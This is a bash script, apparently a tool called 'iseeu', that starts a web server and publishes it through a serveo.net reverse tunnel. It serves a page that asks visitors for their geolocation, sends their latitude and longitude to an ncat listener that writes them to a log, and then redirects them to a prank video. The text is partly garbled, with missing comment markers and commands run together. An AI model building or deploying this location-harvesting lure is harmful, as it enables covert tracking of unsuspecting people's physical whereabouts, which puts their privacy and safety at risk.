#!/bin/bash

clear

Prompt for server port

read -p "[?] Enter port to use for local server (default 8080): " SERVER_PORT SERVER_PORT=${SERVER_PORT:-8080}

Prompt for ncat port

read -p "[?] Enter port to use for logging with Ncat (default 9999): " NCAT_PORT NCAT_PORT=${NCAT_PORT:-9999}

WEB_DIR="$HOME/webpage" LOG_DIR="$HOME/iseeu/logs" TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S') LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"

Cleanup existing processes

echo "[*] Killing existing processes..." pkill -f "python3 -m http.server" 2>/dev/null pkill -f ncat 2>/dev/null pkill -f autossh 2>/dev/null sleep 1

Setup directories

echo "[*] Preparing directories..." mkdir -p "$WEB_DIR" mkdir -p "$LOG_DIR" rm -f "$WEB_DIR/index.html" touch "$LOG_FILE"

Create payload HTML

cat > "$WEB_DIR/index.html" <<EOF

<!DOCTYPE html><html>
<head>
    <title>I See You</title>
    <script>
        function redirectToRickRoll(position) {
            fetch('http://127.0.0.1:$NCAT_PORT/log?loc=' + position.coords.latitude + ',' + position.coords.longitude);
            window.location.href = 'https://shattereddisk.github.io/rickroll/rickroll.mp4';
        }
        function failLocation() {
            alert("Location access denied.");
        }
        window.onload = () => {
            navigator.geolocation.getCurrentPosition(redirectToRickRoll, failLocation);
        };
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
EOFStart Python web server

cd "$WEB_DIR" || exit 1 python3 -m http.server "$SERVER_PORT" > /dev/null 2>&1 & SERVER_PID=$! echo "[+] Python server running on port $SERVER_PORT (PID $SERVER_PID)"

Start Serveo tunnel with autossh

echo "[*] Starting Serveo tunnel with autossh..." autossh -M 0 -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no -R 80:localhost:$SERVER_PORT serveo.net > serveo.log 2>&1 & AUTOSSH_PID=$! sleep 5

TUNNEL_URL=$(grep -oE "https://[a-zA-Z0-9]+\.serveo\.net" serveo.log | head -n1) if [ -n "$TUNNEL_URL" ]; then echo "[\u2713] Public URL: $TUNNEL_URL" else echo "[\u2717] Failed to get Serveo URL." kill $SERVER_PID $AUTOSSH_PID 2>/dev/null exit 1 fi

Start Ncat logger

echo "[*] Logging connections to $LOG_FILE..." ncat -lvkp "$NCAT_PORT" --ssl --exec "/bin/bash -c ' while read line; do if [[ $line == "/log?loc=" ]]; then gps="$(echo $line | cut -d"=" -f2)" echo "GPS: $gps | Time: \$(date)" >> '$LOG_FILE' fi done '" & NCAT_PID=$!

trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $AUTOSSH_PID $NCAT_PID 2>/dev/null; exit' INT

echo "[*] Press Ctrl+C to stop." wait

